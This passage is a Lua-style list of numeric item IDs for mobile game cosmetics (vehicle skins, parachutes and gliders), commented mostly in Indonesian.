    1961016, -- Koenigsegg Jesko (Perak Abu)
    1961017, -- Koenigsegg Jesko (Pelangi)
    1961018, -- Koenigsegg Jesko (Fajar)
    1961029, -- Koenigsegg One:1 Gilt
    1961030, -- Koenigsegg One:1 Cyber Nebula
    1961031, -- Koenigsegg One:1 Jade
    1961032, -- Koenigsegg One:1 Phoenix
    1903074, -- Koenigsegg Gemera (Perak Abu)
    1903075, -- Koenigsegg Gemera (Pelangi)
    1903076, -- Koenigsegg Gemera (Fajar)

    -- [ Lamborghini ]
    1961020, -- Lamborghini Aventador SVJ Verde Alceo
    1961021, -- Lamborghini Centenario Galassia
    1961024, -- Lamborghini Aventador SVJ Blue
    1961025, -- Lamborghini Centenario Carbon Fiber
    1961144, -- Lamborghini Invencible Rosso Efesto
    1961145, -- Lamborghini Invencible Nebula Drift
    1903079, -- Lamborghini Estoque Oro
    1903080, -- Lamborghini Estoque Metal Grey
    1908066, -- Lamborghini Urus Pink
    1908067, -- Lamborghini Urus Giallo Inti

    -- [ Bugatti ]
    1961041, -- Bugatti Veyron 16.4 (Warna-warni)
    1961042, -- Bugatti Veyron 16.4 (Emas)
    1961043, -- Bugatti Veyron 16.4
    1961044, -- Bugatti La Voiture Noire
    1961045, -- Bugatti La Voiture Noire (Paduan)
    1961046, -- Bugatti La Voiture Noire (Prajurit)
    1961047, -- Bugatti La Voiture Noire (Nebula)
    1961151, -- Bugatti Bolide (Cermin)
    1961152, -- Bugatti Bolide (Bỉ Ngạn)
    1961153, -- Bugatti Bolide (Bayangan Es)

    -- [ Aston Martin ]
    1961048, -- Aston Martin Valkyrie (Luminous Diamond)
    1961049, -- Aston Martin Valkyrie (Racing Green)
    1915005, -- Aston Martin DBS Volante (Deep Cosmos)
    1915006, -- Aston Martin DBS Volante (Celestial Pink)
    1915007, -- Aston Martin DBS Volante (Black-Bronze Satin)
    1908084, -- Aston Martin DBX707 (Neon Purple)
    1908085, -- Aston Martin DBX707 (Quasar Blue)

    -- [ Pagani ]
    1961051, -- Pagani Zonda R (Tricolore Carbon)
    1961052, -- Pagani Zonda R (Bianco Benny)
    1961053, -- Pagani Zonda R (Melodic Midnight)
    1961054, -- Pagani Imola (Grigio Montecarlo)
    1961055, -- Pagani Imola (Crystal Clear Carbon)
    1961056, -- Pagani Imola (Nebula Dream)
    1961057, -- Pagani Imola (Arctic Aegis)

    -- [ Bentley ]
    1961137, -- Bentley Batur (Intan Berkilau)
    1961138, -- Bentley Batur (Ujung Waktu)
    1961139, -- Bentley Betayga Azure (Kerajaan Fantasi)
    1908094, -- Bentley Betayga Azure (Hujan Bunga)
    1908095, -- Bentley Betayga Azure (Malam Tenang)
    1915008, -- Bentley Continental GTC Mulliner (Mimpi Indah)
    1915009, -- Bentley Continental GTC Mulliner (Bangsawan Berjubah Ungu)

    -- [ Maserati ]
    1961038, -- Maserati MC20 Bianco Audace
    1961039, -- Maserati MC20 Rosso Vincente
    1961040, -- Maserati MC20 Sogni
    1908075, -- Maserati Levante Blu Emozione
    1908076, -- Maserati Luce Arancione
    1908077, -- Maserati Levante Neon Urbano
    1908078, -- Maserati Levante Firmamento

    -- [ Dodge / SRT ]
    1961036, -- Dodge Challenger SRT Hellcat - Blaze
    1961037, -- Dodge Challenger SRT Hellcat - Lime
    1961050, -- Dodge Challenger SRT Hellcat Jailbreak - Hellfire
    1961136, -- Dodge Challenger SRT Hellcat - Blaze
    1961150, -- Dodge Challenger SRT Hellcat Jailbreak - Hellfire
    1903088, -- Dodge Charger SRT Hellcat - Fuchsia
    1903089, -- Dodge Charger SRT Hellcat - Tuscan Torque
    1903090, -- Dodge Charger SRT Hellcat Jailbreak - Violet Venom
    1903189, -- Dodge Charger SRT Hellcat - Tuscan Torque
    1903190, -- Dodge Charger SRT Hellcat Jailbreak - Violet Venom
    1908086, -- Dodge Hornet - Scarlet Sting
    1908088, -- Dodge Hornet GLH Concept - Redline
    1908089, -- Dodge Hornet - Sunburst
    1908188, -- Dodge Hornet GLH Concept - Redline
    1908189, -- Dodge Hornet - Sunburst

    -- [ Porsche ]
    1961062, -- Porsche 918 Spyder (Aliran)
    1961063, -- Porsche 918 Spyder (964 Silver Metallic)
    1961064, -- Porsche 918 Spyder (Merah Muda)
    1903218, -- Porsche Panamera Turbo S (Biru Safir)
    1903219, -- Porsche Panamera Turbo S (Hijau Viper)
    1908108, -- Porsche Cayenne Turbo GT (Sirkuit Berapi)
    1908109, -- Porsche Cayenne Turbo GT (Oranye Lava)
    1915021, -- Porsche 911 Carrera 4 GTS Cabriolet (Seribu Bintang)
    1915022, -- Porsche 911 Carrera 4 GTS Cabriolet (Merah Ruby)

    -- [ Shelby / Ford ]
    1961058, -- Shelby 427 Cobra (Biru & Putih)
    1961059, -- Shelby 427 Cobra (Graffiti Klasik)
    1903210, -- Shelby GT500 (Hitam & Merah)
    1903211, -- Shelby GT500 (Alien Cyber)
    1961068, -- Ford Mustang GTD (Legenda Hijau Segar)
    1961069, -- Ford Mustang GTD (Semangat Amerika)

    -- [ Lotus ]
    1961060, -- Lotus Emira (Hutan Gelap)
    1961061, -- Lotus Emira (Biru Meluncur)

    -- [ Apollo ]
    1961065, -- Apollo EVO (Emas Cemerlang)
    1961066, -- Apollo EVO (Senja)
    1961067, -- Apollo EVO (Es)
    1903220, -- Apollo Intensa Emozione (Api Neraka)
    1903221, -- Apollo Intensa Emozione (Hantu Ungu)
    1903222, -- Apollo Intensa Emozione (Duel)
    1903223, -- Apollo Intensa Emozione (Badai)

    -- [ SSC Tuatara ]
    1961140, -- Bayangan Mawar SSC Tuatara
    1961141, -- Burung Bangau SSC Tuatara
    1961142, -- Pedang Fajar SSC Tuatara Striker
    1961143, -- Malam Biru SSC Tuatara Striker

    -- [ Tesla ]
    1903071, -- Tesla Roadster (Intan)
    1903072, -- Tesla Roadster (Kristal Ungu)
    1903073, -- Tesla Roadster (Biru Laut)

    -- [ Ducati / Motor VIP ]
    1901073, -- DUCATI Panigale V4S
    1901074, -- Ducati Panigale V4S Black Phantom
    1901075, -- Ducati Panigale V4S Crimson Storm
    1901076, -- Ducati Panigale V4S Swift Mirage

    -- ==============================================================================
    -- 3. LENGKAP PAYUNG TERJUN (DÙ RƠI, TÀU LƯỢN, VÁN TRƯỢT BAY)
    -- ==============================================================================
    -- [ PAYUNG (Parachutes) ]
    202408127, -- Stormcloud Bastion Theme
    61510026, -- Moonlit Haunting Background (Lv. 1)
61510027, -- Moonlit Haunting Background (Lv. 2)
    1401000, -- New Years Blessing Parachute
    1401001, -- Happy New Year Parachute
    1401002, -- Payung Tulang Merah
    1401003, -- Payung Iblis kecil nakal
    1401005, -- Payung Laba-laba transformasi
    1401006, -- Payung Musim 5
    1401007, -- Payung Ulang Tahun
    1401008, -- Payung Bangau Emas
    1401009, -- Payung Iblis Merah
    1401010, -- Payung Bunga Liar
    1401011, -- Payung Bunga Sakura
    1401012, -- Payung Campus Tournament
    1401013, -- Payung Joker
    1401014, -- Payung Badut
    1401015, -- Carabao Parachute
    1401016, -- Orange Life Parachute
    1401017, -- Payung Elang Emas
    1401018, -- Payung Juara Musim 8
    1401019, -- Payung Kapten Ryan
    1401020, -- Payung Pengembara
    1401021, -- Payung Busur Bulan
    1401022, -- OPPO F11 PRO SURVIVOURS PARACHUTE
    1401023, -- Payung Penguasa Sekigahara (Kotak)
    1401024, -- Payung Sekutu Loot Tipis
    1401025, -- Payung Malam Misterius (Kotak)
    1401026, -- Payung Keberuntungan
    1401027, -- Payung PMCO
    1401028, -- Payung Juara Musim 7
    1401029, -- Payung Ulang Tahun Cemerlang
    1401031, -- Payung Juara Musim 6
    1401032, -- Payung Belati Merah
    1401033, -- Payung WALKER
    1401034, -- Payung Penyihir Es
    1401035, -- Payung Penantang
    1401036, -- Payung BAPE X PUBGM CAMO
    1401037, -- Payung Godzilla (Putih)
    1401038, -- Payung Godzilla (Emas)
    1401039, -- Payung Godzilla (Biru)
    1401040, -- Payung Monarch
    1401041, -- Payung Kari
    1401043, -- Payung Penjaga Malam
    1401044, -- Payung Mawar Hitam
    1401045, -- Payung Kucing Keberuntungan
    1401046, -- Payung Malam Kelam
    1401047, -- Payung Paus Pembunuh
    1401048, -- Payung Monster Kraken
    1401050, -- Payung Melodi Musik
    1401051, -- Payung OPPO Reno
    1401052, -- Payung OPPO VOOC
    1401053, -- Payung Malam Misterius
    1401054, -- Payung Babi Nakal
    1401055, -- Payung Merah (Panjang)
    1401056, -- PMJC Parachute
    1401057, -- PMSC Parachute
    1401059, -- Payung Juara Draconian
    1401060, -- Payung Penguasa Sekigahara
    1401061, -- Payung Iblis Kecil
    1401062, -- Payung Juara Musim 9
    1401063, -- Payung Juara Musim 10
    1401064, -- Payung Kucing Hitam
    1401065, -- Payung Ayam Jago
    1401066, -- Payung Kutu Buku Es
    1401067, -- Payung Penghilang Nyeri #11
    1401068, -- Super Power Parachute
    1401071, -- Payung Reinkarnasi Tanpa Akhir
    1401072, -- Payung Raja Segala Makhluk
    1401074, -- Payung Labu Mengerikan
    1401085, -- Payung Ayam Lezat
    1401086, -- Payung Juara Musim 11
    1401087, -- Payung Teratai Darah
    1401088, -- Payung Planet Hanyut
    1401089, -- Payung Juara Musim 12
    1401090, -- Payung Ninja Pembunuh
    1401091, -- Payung Neko Sakura
    1401092, -- Payung Pelopor
    1401094, -- Payung Gadis Fantasi
    1401095, -- Payung Lukisan Medan Perang
    1401096, -- Payung Hakim
    1401097, -- Payung Africa Pride
    1401098, -- Payung Africa Unite
    1401100, -- Payung Si Emas
    1401102, -- Payung Agen PMSC World Cup
    1401103, -- Payung Legiun Hilang
    1401104, -- Payung Turnamen PMCO
    1401106, -- Payung Letnan Luar Angkasa
    1401107, -- Payung Pelayan Taring Darah
    1401108, -- Payung Street Dancer 3
    1401109, -- Payung Unique KingCard
    1401111, -- Payung Roti U
    1401112, -- Payung Jeritan
    1401113, -- Payung Penjaga Kemerdekaan
    1401115, -- Payung Permen
    1401117, -- Payung Koboi Wild West
    1401119, -- Payung Baju Zirah Samurai
    1401122, -- Incredible Parachute
    1401124, -- Payung Prajurit
    1401125, -- Payung Wanita Gothic
    1401127, -- Payung Mitologi Arab
    1401128, -- Payung Juara Arena
    1401129, -- Payung Juara Musim 13
    1401130, -- Payung Gorila
    1401131, -- Payung PMGC
    1401133, -- Payung Musim 15
    1401134, -- Payung Tulip
    1401135, -- Payung Iblis Kemarahan
    1401137, -- Payung Musim 14
    1401138, -- Payung Pro League (Emas)
    1401139, -- Payung Pro League (Perak)
    1401140, -- Payung Unta Keren
    1401141, -- Payung Ayam Goreng
    1401142, -- Payung Klub Kerajaan
    1401145, -- Payung Tujuh Warna
    1401146, -- Payung Mountain Dew
    1401147, -- Payung Pendeta Tertinggi
    1401148, -- Payung Idol
    1401149, -- Payung Rentangkan Sayap
    1401150, -- Payung Prajurit Baja
    1401151, -- Payung Juara Musim 16
    1401152, -- Payung Sabit Kematian
    1401153, -- Payung emoji Puas
    1401154, -- Payung emoji
    1401155, -- Payung emoji Ceria
    1401156, -- Payung Qualcomm
    1401157, -- Payung Titik Kumpul
    1401159, -- Payung Penguasa Diktator
    1401160, -- Payung Pemecah Kacang Ceria
    1401161, -- Payung Raja Naga
    1401163, -- Payung Baju Zirah Perang
    1401164, -- Payung Melodi Cinta
    1401165, -- Payung Juara Musim 17
    1401167, -- Payung Cahaya Bulan Misterius
    1401168, -- Payung Pesta Disko
    1401169, -- Payung Juara Musim 18
    1401170, -- Payung Salju Sakura
    1401171, -- Payung Sarang Lebah
    1401174, -- Payung Juara Musim 19
    1401177, -- Payung Juara C1S1
    1401178, -- Payung Es Krim
    1401179, -- Payung El Diablo
    1401181, -- Raja Es - Payung
    1401182, -- Payung Pemburu Laut Biru
    1401183, -- Payung Mimpi Kupu-kupu
    1401184, -- Payung Kumbang
    1401186, -- Payung Kura-kura dan Kelinci
    1401187, -- Payung Langkah Kuat
    1401188, -- Payung PMPL Musim Semi 2021
    1401189, -- Payung GodzillaVsKong
    1401190, -- Payung Perjalanan Ajaib
    1401191, -- Payung Jejak Luar Angkasa
    1401192, -- Payung Koki Ayam
    1401193, -- Payung Seni Warna-warni
    1401194, -- Payung Aerial Punk Rich Brian
    1401195, -- Payung OPPO
    1401196, -- Payung BUG
    1401197, -- Payung Raja Roda Gigi
    1401198, -- Payung Xiaomi
    1401200, -- Payung Mata Laut Dalam
    1401201, -- Payung OnePlus
    1401204, -- Payung foodpanda
    1401205, -- Payung PMPL Musim Gugur 2021
    1401208, -- Payung Kota di Atas Awan
    1401209, -- Payung Hantu Masa Depan
    1401210, -- Payung Mata-mata Mekanik
    1401212, -- Payung Kota Warna-warni
    1401213, -- Payung Senjata Bunga Mawar
    1401215, -- Payung Es
    1401216, -- Payung Peta Harta Karun
    1401217, -- Payung Demam Natal
    1401218, -- Payung Motif Emas
    1401219, -- Payung Kerajaan Emas
    1401220, -- Payung Senja Cemerlang
    1401221, -- Payung Merpati Putih
    1401222, -- Payung Putaran Waktu
    1401223, -- Payung Zong
    1401224, -- Payung Juara C1S2
    1401225, -- Payung Juara C1S3
    1401227, -- Payung Diskon Besar
    1401228, -- Payung Pengembara Modern
    1401231, -- Payung PMGC 2021
    1401232, -- Payung Liverpool FC
    1401233, -- Payung Terobosan
    1401234, -- Payung Gajah Warna-warni
    1401235, -- Payung Kolaborasi Egor Kreed
    1401236, -- Gackt Moon Parachute
    1401237, -- Payung Dune
    1401238, -- Payung Guruh Gundala
    1401239, -- Payung C2S4
    1401240, -- Payung Baby Shark
    1401241, -- Payung JAPAN LEAGUE S2
    1401242, -- Payung Koki Monster
    1401243, -- Payung Penguasa Lautan
    1401244, -- Payung C2S5
    1401245, -- Payung Ratu Elektronik
    1401246, -- Payung Tahun Macan
    1401247, -- Payung Warna Musim Semi
    1401248, -- Payung Jujutsu Kaisen
    1401249, -- Payung Shiba Inu
    1401250, -- Payung Motorola
    1401252, -- Payung Pertempuran Trendi
    1401254, -- Payung DJ Berkarakter
    1401255, -- Payung Kakak Adik
    1401256, -- Payung Graffiti Neon
    1401257, -- Payung C2S6
    1401258, -- Payung Spider-Man: No Way Home
    1401259, -- Payung Pembunuh Waktu
    1401260, -- Payung Tanah Gurun
    1401261, -- Payung Warna-warni
    1401262, -- Payung Festival Warna
    1401263, -- Payung Sirkus Ajaib
    1401264, -- Payung Gadis Berambut Merah
    1401265, -- Payung Pasangan Sempurna
    1401266, -- Payung Gadis Kembar
    1401267, -- Payung Gerbang Aneh
    1401268, -- Payung Gadis Anime
    1401269, -- Payung Ayam Petarung
    1401270, -- Payung Lilin Hijau
    1401271, -- Payung Hantu Nakal
    1401272, -- Payung Gadis Berdoa
    1401273, -- Payung Penyihir Cantik
    1401274, -- Payung Evangelion NERV
    1401275, -- Payung Kakak Adik Kembar
    1401276, -- Payung PMPL Musim Semi 2022
    1401277, -- Payung Teddy Bear GB
    1401278, -- Payung Singa Fashion
    1401280, -- Payung Kenangan Masa Kecil
    1401281, -- Payung C3S7
    1401282, -- Payung Kucing Raksasa
    1401283, -- Payung Butterfinger
    1401284, -- Payung Lompat Super
    1401285, -- Payung Sekutu Musim Panas
    1401286, -- Payung Tupai
    1401287, -- Payung Baju Zirah Api
    1401289, -- Payung Heartrocker
    1401290, -- Payung Singa Mesopotamia
    1401291, -- Payung realme
    1401292, -- Payung Lil Burger
    1401294, -- Payung Sungai Mimpi
    1401295, -- Payung C3S8
    1401296, -- Payung Malam Keajaiban
    1401298, -- Payung Kejayaan
    1401299, -- Payung Peta Bintang
    1401300, -- Payung Raja Duri Beracun
    1401301, -- Payung Hantu dan Gadis
    1401302, -- Payung Duri Kecil
    1401303, -- Payung Uqabi
    1401308, -- Payung Penyihir Es
    1401309, -- Payung Kecepatan Maksimum
    1401310, -- Payung PMWI 2022
    1401311, -- BGMI Esports Parachute
    1401312, -- PMJL SEASON3 Parachute
    1401313, -- PMPS 2022 Parachute
    1401314, -- Payung Prajurit Kerbau
    1401315, -- Payung Kekuatan Tertinggi
    1401316, -- Payung Tim Bola Arab
    1401317, -- Payung Seribu Bintang Cemerlang
    1401318, -- Payung Penyihir Astronomi
    1401319, -- Payung C3S9
    1401320, -- Payung BoBoiBoy
    1401323, -- Payung Sirkuit Liar
    1401324, -- Payung Rusa Putih
    1401325, -- Payung Kapak Emas
    1401326, -- Payung Emas Misterius
    1401330, -- Payung Wisata Nebula
    1401332, -- Payung Kucing Salju
    1401334, -- Payung KFC
    1401335, -- Payung Singa Laut Mengamuk
    1401336, -- Payung Tengkorak Batu
    1401337, -- Payung Penguasa Langit
    1401338, -- Payung Grubhub
    1401339, -- Payung AFA
    1401340, -- Payung Legenda Bintang Messi
    1401343, -- Payung PMGC 2022
    1401345, -- Payung Peta Harta Karun
    1401346, -- Payung Nobru
    1401347, -- Payung Sony
    1401349, -- Payung Serangan Udara
    1401351, -- Payung Pahlawan Wanita
    1401353, -- Payung Badut Licik
    1401355, -- Payung Bruce Lee
    1401356, -- Payung Pasangan Beraksi
    1401357, -- Payung Donkey King
    1401360, -- Payung Pro League
    1401361, -- Payung Rencana Merah Tua
    1401362, -- Payung C4S11
    1401363, -- Payung Peta Luar Angkasa
    1401364, -- Payung BE@RBRICK
    1401365, -- Payung Sumber Cahaya Kejayaan
    1401366, -- Payung Kenangan Lama
    1401367, -- Payung Bugatti
    1401368, -- Payung Fosil Dinosaurus
    1401369, -- Payung Pelarian T-Rex
    1401370, -- Payung Dragon Ball Super
    1401371, -- Payung C4S12
    1401372, -- Payung Darah Naga
    1401373, -- UNIVERSTAR BT21 Parachute
    1401374, -- Payung HUAWEI AppGallery
    1401375, -- Payung PMWI 2023
    1401376, -- Payung C5S13
    1401377, -- Payung Kelinci Disko
    1401378, -- Payung Aston Martin
    1401379, -- Payung Musim Panas di Pantai
    1401380, -- Payung C5S14
    1401381, -- Payung C5S15
    1401382, -- Payung PMGC 2023
    1401383, -- Payung KFC
    1401385, -- Payung Yeti Raksasa
    1401386, -- Payung Pagani
    1401387, -- Payung Macan Tutul Warna-warni
    1401388, -- Payung Tupai Lucu
    1401389, -- Payung Salamander Merah Muda
    1401390, -- RS Swagster Parachute
    1401391, -- Payung Panda Manis
    1401392, -- Payung Prajurit Mawar
    1401393, -- Payung Pertempuran Keadilan
    1401394, -- Payung LINE FRIENDS
    1401395, -- Payung Rubah Misterius
    1401396, -- Payung Zanmang Loopy
    1401397, -- Hardik Sky Parachute
    1401398, -- Payung C6S16
    1401399, -- Payung Hantu Memikat
    1401400, -- Payung Perlindungan Kerajaan
    1401401, -- Payung Bentley
    1401402, -- SPY×FAMILY Payung
    1401403, -- Payung Gerhana
    1401404, -- Payung Prajurit Dewa
    1401405, -- Payung C6S17
    1401406, -- Payung Melodi Kucing
    1401407, -- Payung Kota Kacau
    1401408, -- Payung Sayap Pengawal
    1401409, -- Payung Kuda Besi
    1401410, -- Payung Terbang Luar Angkasa
    1401411, -- Payung C6 S18
    1401412, -- Payung Ratu Kegelapan
    1401413, -- Payung Kolaborasi Lamborghini
    1401416, -- Payung Patung Batu Kuno
    1401417, -- Payung Laut Biru
    1401418, -- KAKAO FRIENDS Parachute
    1401419, -- Payung Infinix GT
    1401420, -- Payung Esports World Cup 2024
    1401421, -- Payung C7S19
    1401422, -- Payung Kelinci Nakal
    1401423, -- Payung Kolaborasi VW
    1401424, -- Payung Kucing Warna-warni
    1401425, -- Payung Mata Naga Hitam
    1401426, -- Payung Yin-Yang
    1401427, -- NieR:Automata Parachute
    1401428, -- Payung Gairah Esports
    1401429, -- Payung C7S20
    1401430, -- Payung Venom: The Last Dance
    1401431, -- Payung Suku Galaksi
    1401432, -- Payung Rusa Kerajaan
    1401433, -- Payung McLaren
    1401434, -- Payung PMGC 2024
    1401435, -- Payung Layang Serigala Salju
    1401436, -- Payung Layang Busa Air
    1401437, -- Payung Layang C7S21
    1401438, -- Payung Ikan Koi Musim Semi
    1401439, -- Payung Elang
    1401440, -- Payung Mawar Malam
    1401441, -- Opanchu Parachute
    1401442, -- Neon Drop BE 6 Parachute
    1401443, -- Payung C8S22
    1401444, -- Payung Layang Tulang Hitam
    1401445, -- Payung Bintang Aurora
    1401446, -- Godzilla vs. Payung Destoroyah
    1401447, -- Payung Kelinci Mengambang
    1401448, -- Parachute(Frieren&Fern)
    1401449, -- Payung C8S23
    1401450, -- Payung Layang Kode Digital
    1401451, -- Payung Layang Amplifikasi Warna
    1401452, -- Payung Kolaborasi Shelby
    1401453, -- Payung Senja Membara
    1401454, -- Payung Attack on Titan
    1401455, -- Payung Mekanik
    1401456, -- Mountain Dew Neon Shard Parachute
    1401457, -- Payung C8S24
    1401458, -- Payung Luar Angkasa
    1401459, -- Payung Transformers
    1401460, -- Payung Takdir
    1401461, -- Payung Anjing Kesayangan
    1401462, -- Bbangbbang's diary Parachute
    1401463, -- Realme Parachute
    1401464, -- Payung Infinix GT
    1401465, -- Payung C9S25
    1401466, -- Payung Iblis
    1401467, -- Payung Kaiju No. 8
    1401468, -- Payung TIM SONIC
    1401469, -- Payung Kupu-kupu Berkilau
    1401470, -- Payung Lotus
    1401471, -- Payung Berbulu Halus
    1401472, -- Payung Generasi Sempurna
    1401473, -- Tokyo Revengers Parachute
    1401474, -- Sky Striker Parachute
    1401475, -- Payung C9S26
    1401476, -- Payung Layang Beruang Manis
    1401477, -- Payung Balenciaga
    1401478, -- Payung Layang Salju Dingin
    1401479, -- Payung Porsche
    1401480, -- Payung Roh Hitam
    1401481, -- Payung Musang Santai
    1401482, -- TV Anime DAN DA DAN Parachute
    1401483, -- Payung C9S27
    1401484, -- Payung Layang Shuriken
    1401485, -- Payung Hantu Inggris
    1401486, -- Payung The King of Fighters
    1401487, -- Payung Layang Tarian
    1401488, -- Payung Batu Mulia
    1401489, -- Payung Rantai Musim (2026H1)
    1401490, -- Payung S28
    1401491, -- Payung Permainan Badut Licik
    1401492, -- Payung Apollo
    1401493, -- Payung Hacker Dingin
    1401494, -- Payung Pertemuan Dimensi
    1401495, -- Catch! Teenieping Parachute
    1401496, -- SAKAMOTO TARO Parachute
    1401497, -- Nakiri Ayame Parachute
    1401498, -- Payung S29
    1401499, -- Toxic Parachute
    1401500, -- Payung Merah (Bulat)
    1401511, -- Payung Kucing Nakal
    1401513, -- Payung San Martin FC
    1401515, -- Payung Mata Iblis
    1401516, -- Payung Gelombang Malam
    1401517, -- Payung Jeruk
    1401519, -- Payung Beruang Tidur
    1401520, -- Payung Keturunan Kaisar
    1401521, -- Payung Awan Bergulung
    1401526, -- Payung Motif Megah
    1401527, -- Payung Hati Laut
    1401528, -- Payung Planet Ibu
    1401529, -- Payung Pangeran Emas
    1401530, -- Payung Baju Zirah Duri
    1401531, -- Payung Zona Bahaya
    1401532, -- Payung Siput Laut
    1401534, -- Payung Bebek Kuning B.Duck
    1401538, -- Payung Kelinci Lembut
    1401540, -- Payung Yeti
    1401541, -- Payung Pixel Warna
    1401542, -- Payung Rasa Lezat
    1401543, -- Payung I Love Tao Kae Noi
    1401544, -- Payung Bayi Burung Beo
    1401545, -- Payung UFO
    1401546, -- Payung Baby Shark
    1401547, -- Payung Boneka Beruang
    1401548, -- Payung Kucing Serius
    1401549, -- Payung Kejayaan Abadi
    1401551, -- Payung Ratu Baju Zirah
    1401554, -- Payung Dinosaurus Pixel
    1401555, -- Payung Kupu-kupu Kerajaan
    1401556, -- Payung Perjalanan Manis
    1401610, -- Payung Selamat Ulang Tahun
    1401611, -- Payung Panggung Berkilau
    1401613, -- Payung Hakim Anubis
    1401615, -- Payung Dewa Horus
    1401616, -- Payung One Plus
    1401617, -- Payung Singa Mengaum
    1401618, -- Payung Facebook
    1401619, -- Payung Jimat Firaun
    1401620, -- Payung Firaun (Biru)
    1401621, -- Payung Taring Darah
    1401622, -- Payung LINE FRIENDS
    1401623, -- Payung PMNC 2021
    1401624, -- Payung Poseidon
    1401625, -- Payung Putri Suku
    1401628, -- Payung Phoenix Adarna Ajaib
    1401629, -- Payung Gadis Pencipta
    1401811, -- Giannis Parachute
    1401813, -- Payung Perjalanan Pahlawan
    1401814, -- Payung Rock 'n' Roll
    1401815, -- Payung Komandan Medan Perang
    1401816, -- Payung BURGER KING
    1401817, -- Payung Prajurit Elang Darah
    1401820, -- Payung Ikan Terbang
    1401822, -- Payung Monster Rawa
    1401823, -- Payung Penguasa Angin
    1401824, -- Payung Kotak Hadiah
    1401826, -- Payung - Cinta Pertama
    1401827, -- Payung Ratu Kopi
    1401828, -- Payung Penjaga Kuno
    1401829, -- Payung Murka Dewa
    1401832, -- Payung C4S10
    1401833, -- Payung Monster Labirin
    1401835, -- Payung Poker Perlawanan
    1401836, -- Payung Permainan Badut
    1401837, -- Payung Ilusi
    1401838, -- Payung BLUE LOCK
    1401839, -- Payung Ford
    1401840, -- Payung Harley-Davidson®
    1401841, -- Payung Mawar Tulang
    1401842, -- Payung Kembar
    1401843, -- Payung Layang Mahkota
    1401844, -- Parachute(Pubniku)
    1401845, -- Payung S30
    1401846, -- Payung Event Trial of Fire

    -- [ KAPAL LAYANG / PAPAN SELUNCUR / PERALATAN TERBANG (Gliders/Hoverboards) ]
    4151001, -- Payung (Biru)
    4151002, -- Efek Terjun Payung (Emas)
    4151003, -- Asap Layang Payung (Merah Muda)
    4151004, -- Asap layang biru
    4151006, -- Asap layang pelangi
    4151010, -- Peralatan terbang Bằng Chíu
    4151012, -- Papan Seluncur Siklus
    4151013, -- Papan Seluncur Salju
    4151014, -- Papan seluncur SIKLUS 2
    4151015, -- Asap Layang Payung Selamat (3 warna)
    4151017, -- Papan seluncur Hati Hutan Hijau
    4151018, -- Papan seluncur Ulang Tahun
    4151019, -- Kapal Layang Dewa Cinta
    4151020, -- Papan Seluncur Penjaga C3
    4151021, -- Kapal Layang Utusan Dewa
    4151022, -- Kapal Layang Sayap Emas
    4151023, -- Papan Seluncur Kolaborasi Messi
    4151024, -- Kapal Layang Imam Merah Tua
    4151025, -- Kapal Layang Layang-layang Kertas
    4151026, -- Papan Seluncur Guru Bela Diri
    4151027, -- Papan Seluncur Siklus 4
    4151028, -- Papan Seluncur Air Mata Darah
    4151029, -- Kapal Layang Ratu Cahaya
    4151030, -- Kapal Layang Raja Darah
    4151031, -- Kapal Layang Dinosaurus Koin
    4151032, -- Kapal Layang Sayap Naga Merah Tua
    4151034, -- Awan Terbang
    4151035, -- Kapal Layang Simfoni Angin
    4151036, -- Papan Seluncur Mesin Gelombang
    4151037, -- Papan Seluncur SIKLUS 5
    4151038, -- Kapal Layang Mutiara Sempurna
    4151040, -- Papan seluncur Pemburu Listrik
    4151041, -- Kapal Layang Tulang Biru
    4151042, -- Kapal Layang Putri Teknologi
    4151043, -- Kapal Layang Putri Teknologi
    4151044, -- Papan Seluncur Hiu
    4151045, -- Kapal Layang Musim Dingin Kerajaan
    4151046, -- Papan Seluncur Pisau Langit Biru
    4151056, -- Kapal Layang Musim Dingin Kerajaan
    4151057, -- Papan Seluncur Rubah Api
    4151058, -- Kapal Layang LINE FRIENDS
    4151059, -- Papan Seluncur Menembus Awan
    4151060, -- Kapal Layang Ular Emas
    4151061, -- Papan Seluncur SIKLUS 6
    4151062, -- Asap Layang Payung Zanmang Loopy
    4151063, -- SPY×FAMILY Kapal Layang Bond
    4151064, -- Kapal Layang Malaikat
    4151065, -- Kapal Layang Malaikat
    4151066, -- Kapal Layang Raja Alam
    4151067, -- Kapal Layang Kaleidoskop
    4151068, -- Kapal Layang Raja Duri Beracun
    4151069, -- Kapal Layang Nebula Petir
    4151070, -- Kapal Layang Ksatria Dewa
    4151071, -- Kapal Layang Dewa Cinta
    4151072, -- Kapal Layang Naga Luar Angkasa
    4151073, -- Kapal Layang Neon Misterius
    4151074, -- PUBGM X NewJeans Glider
    4151075, -- Kapal Layang Dewa Cinta
    4151076, -- Kapal Layang Dewa Sembilan Angin
    4151077, -- Pesawat Terbang
    4151078, -- Kapal Layang Kuda Laut Besi
    4151079, -- Kapal Layang Sayap Dunia Bawah
    4151080, -- Papan Seluncur Siklus 7
    4151083, -- Kapal Layang Tulang Naga
    4151084, -- Api Merah - Kar98 (Cấp 8)
    4151085, -- Kapal Layang Sayap Baja
    4151086, -- DP Drift Parachute
    4151087, -- Kapal Layang Tulang Naga
    4151089, -- Kapal Layang Burung Hitam
    4151090, -- Kapal Layang Mimpi Manis
    4151091, -- Kapal Layang Penjelajah Luar Angkasa
    4151092, -- Kapal Layang Singa Biru Bintang
    4151093, -- Kapal Layang Serigala Giok
    4151094, -- Papan Seluncur SIKLUS 8
    4151095, -- Kapal Layang Sayap Anukhra
    4151096, -- Kapal Layang Sayap Firaun
    4151097, -- Kapal Layang Monster Ghidorah
    4151098, -- Kapal Layang Waktu Berubah
    4151099, -- Kapal Layang Kekuasaan Gelap
    4151103, -- Kapal Layang Kereta Bintang
    4151104, -- Kapal Layang Peralatan ODM
    4151105, -- Kapal Layang Sumpah Darah
    4151106, -- Kapal Layang Cahaya Elektromagnetik
    4151107, -- Kapal Layang Kereta Bintang
    4151108, -- Kapal Layang Laserbreak
    4151109, -- Kapal Layang Dewa Es
    4151110, -- Kapal Layang Naga Suci
    4151111, -- Kapal Layang Pemburu Reaksi
    4151112, -- Kapal Layang Dewa Kegelapan
    4151113, -- Papan Seluncur SIKLUS 9
    4151114, -- Kapal Layang Naga Suci
    4151115, -- Kapal Layang Dewa Es
    4151117, -- Kapal Layang Preondactyl
    4151118, -- Kapal Layang Kupu-kupu Berkilau
    4151119, -- Kapal Layang Sapu Ajaib
    4151120, -- Kapal Layang Kaca Naga
    4151121, -- Mikey Glider
    4151122, -- Kapal Layang Kupu-kupu Berkilau
    4151123, -- Kapal Layang Es Kristal
    4151124, -- Kapal Layang Sayap Darah Kematian
    4151125, -- Kapal Layang Penjaga Galaksi
